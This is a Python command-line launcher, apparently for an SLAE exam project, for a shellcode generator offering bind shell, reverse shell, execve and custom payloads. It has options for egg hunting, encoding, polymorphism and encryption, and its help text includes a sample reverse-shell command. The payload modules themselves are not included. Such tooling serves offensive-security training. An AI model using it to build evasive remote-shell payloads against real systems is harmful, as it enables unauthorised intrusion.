#!/usr/bin/env python

# Author: Joshua Arnold (@huskersec)
# License: MIT License
# Tool to meet objectives of SLAE exam

import sys
import argparse

#insert super amazing trex ascii art here

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
    description='Description: Pass args for shellcode generation', 
    usage='./trexshellz.py <options> <payload> <payload args>' + "\n"
        'Current payloads are:' + "\n"
        '    bind_shell' + "\n"
        '    reverse_shell' + "\n"
        '    execve_stack' + "\n"
        '    custom' + "\n",
    epilog=
        '-Bind shell: ./trexshellz.py bind_shell --LPORT 4321' + "\n"
        '-Reverse shell: ./trexshellz.py reverse_shell --LHOST 192.168.1.1 --LPORT 4321' + "\n"
        '-Execve-stack: ./trexshellz.py execve_stack' + "\n"
        '-Custom: ./trexshellz.py custom --SHELLCODE <shellcode>' + "\n"
        '-EggHunter: ./trexshellz.py --EGG bind_shell --LPORT 4321' + "\n"
        '-Encode: ./trexshellz.py --ENCODE bind_shell --LPORT 4321' + "\n"
        '-Analyze: ./trexshellz.py custom --ANALYZE --SHELLCODE <shellcode>' + "\n"
        '-Polymorph: ./trexshellz.py --POLYMORPH bind_shell --LPORT 4321' + "\n"
        '-Crypter: ./trexshellz.py --CRYPT bind_shell --LPORT' + "\n")  


### payload parsers ###
subparsers = parser.add_subparsers(dest='payload')

parser_bindshell = subparsers.add_parser('bind_shell')
parser_bindshell.add_argument("--LPORT", required=True, metavar='<port>', type=int, 
    help="specify port for bind shell - must be > 256 to avoid null bytes")

parser_reverseshell = subparsers.add_parser('reverse_shell')
parser_reverseshell.add_argument("--LHOST", required=True, metavar='<host>', 
    help="specify ip for reverse shell - no octet should contain a 0")
parser_reverseshell.add_argument("--LPORT", required=True, metavar='<port>', type=int, 
    help="specify port for reverse shell - must be > 256 to avoid null bytes")

parser_execvestack = subparsers.add_parser('execve_stack')

parser_custom = subparsers.add_parser('custom')
parser_custom.add_argument("--SHELLCODE", required=True, metavar='<shellcode>', 
    help="specify shellcode")


### option parsers ###
parser.add_argument("--EGG", action='store_true', 
    help="specify egg hunter technique, egg is hex \"x90x50x90x50\"")
parser.add_argument("--ENCODE", action='store_true', 
    help="specify the built-in encoding technique")
parser.add_argument("--ANALYZE", action='store_true', help="analyze a given shellcode")
parser.add_argument("--POLYMORPH", action='store_true', 
    help="specify polymorphism to use on given shellcode")
parser.add_argument("--CRYPT", action='store_true', help="specify the built-in crypter")

args = parser.parse_args()

#print args    # prints namespace and all values of args

if args.payload == 'bind_shell':
    #print '%s payload selected w/ %i as port' % (args.payload,args.LPORT)
    args_port = args.LPORT
    args_host = False
    args_egg = args.EGG
    if args.LPORT <= 256:
        print "Please specify port greater than 256!"
    else:
        sys.path.insert(0,"Modules/BindShell/")
        import bind_shell
        if args.EGG is not False:
            print "EGG has been set"
            print "copy the \"egghunter\" and \"payload\" values to the egghunter_template.c file and compile"
            sys.path.insert(0,"Modules/EggHunter/")
            import egg_hunter

elif args.payload == 'reverse_shell':
    #print '%s payload selected w/ %s as host and %i as port' % (args.payload,args.LHOST,args.LPORT)
    args_host = args.LHOST
    args_port = args.LPORT
    args_egg = args.EGG
    if args.LPORT <= 256:
        print "Please specify port greater than 256!"
    #elif args.LHOST need to implement a check for IPs containing .0. 
    else:
        sys.path.insert(0,"Modules/ReverseShell/")
        import reverse_shell
        if args.EGG is not False:
            print "EGG has been set"
            print "copy the \"egghunter\" and \"payload\" values to the egghunter_template.c file and compile"
            sys.path.insert(0,"Modules/EggHunter/")
            import egg_hunter


elif args.payload == 'execve_stack':
    import execve_stack

elif args.payload == 'custom':
    args_shellcode = args.SHELLCODE
    print args_shellcode

else:
    print "Please select a payload!"
